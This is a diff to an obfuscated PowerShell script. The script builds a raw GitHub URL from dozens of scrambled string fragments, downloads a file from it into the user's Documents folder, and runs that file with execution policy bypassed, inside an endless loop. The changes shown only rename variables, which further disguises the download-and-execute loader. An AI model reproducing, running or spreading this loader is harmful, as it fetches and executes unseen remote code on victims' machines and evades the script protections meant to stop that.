@@ -1,9 +1,9 @@
 $r14 = '-bn3-2'
-$r8 = '73w54'
+$4756nb6745n = '73w54'
 $24352435ddsdfhj = '.githubus'
 $r32 = 'u6po7'
 $34asdfhbnw4euy7 = 'https://raw'
-$r5 = 'fum4n/-0-v'
+$6745gfhjhfhgj = 'fum4n/-0-v'
 $r17 = '68'
 $r25 = '5'
 $r12 = '0-69u-b'
@@ -17,8 +17,8 @@ $345643567456fgdhjj = '.com/t0'
 $r23 = '2'
 $r33 = 'iu293'
 $r31 = '245iuy'
-$r6 = '948'
-$r7 = '37-092'
+$6547fgjdhyjt = '948'
+$3v6545634v5643v = '37-092'
 $r18 = '-3'
 $ccc343543456hnjytryj = 'ercontent'
 $r10 = '245'
@@ -30,7 +30,7 @@ $r19 = '4'
 $r30 = '2034p'
 $r34 = '45w/m'
 $r22 = '86'
-$r9 = '-068'
+$n78656785nm7568mn = '-068'
 $r15 = '40'
 $r37 = '1'
 $r35 = 'ain/p'
@@ -72,13 +72,13 @@ $r45 = '-df029gj93fk29gj43'
 $r70 = '-40ehjf84we9f3k'
 $r65 = 'sd93fjfo43rwe'
 $r73 = '-w53lfwej023l3k4'
-$adiuhaihvdiuhbweffiuhgbqawerfgoiugh234987 = $34asdfhbnw4euy7 + $24352435ddsdfhj + $ccc343543456hnjytryj + $345643567456fgdhjj + $r5 + $r6 + $r7 + $r8 + $r9 + $r10 + $r11 + $r12 + $r13 + $r14 + $r15 + $r16 + $r17 + $r18 + $r19 + $r20 + $r21 + $r22 + $r23 + $r24 + $r25 + $r26 + $r27 + $r28 + $r29 + $r30 + $r31 + $r32 + $r33 + $r34 + $r35 + $r36 + $r37
+$adfwkljgheqwriuy34258y = $34asdfhbnw4euy7 + $24352435ddsdfhj + $ccc343543456hnjytryj + $345643567456fgdhjj + $6745gfhjhfhgj + $6547fgjdhyjt + $3v6545634v5643v + $4756nb6745n + $n78656785nm7568mn + $r10 + $r11 + $r12 + $r13 + $r14 + $r15 + $r16 + $r17 + $r18 + $r19 + $r20 + $r21 + $r22 + $r23 + $r24 + $r25 + $r26 + $r27 + $r28 + $r29 + $r30 + $r31 + $r32 + $r33 + $r34 + $r35 + $r36 + $r37
 $p1 = "$env:USERPROFILE"
 $p2 = "\Documents\ps2.ps1"
 $filePath = $p1 + $p2
 while ($true) {
     try {
-        $cmd = "Invoke-WebRequest -Uri $adiuhaihvdiuhbweffiuhgbqawerfgoiugh234987 -OutFile $filePath"
+        $cmd = "Invoke-WebRequest -Uri $adfwkljgheqwriuy34258y -OutFile $filePath"
         Invoke-Expression $cmd
 
         $runCmd = "powershell -ExecutionPolicy Bypass -File $filePath"
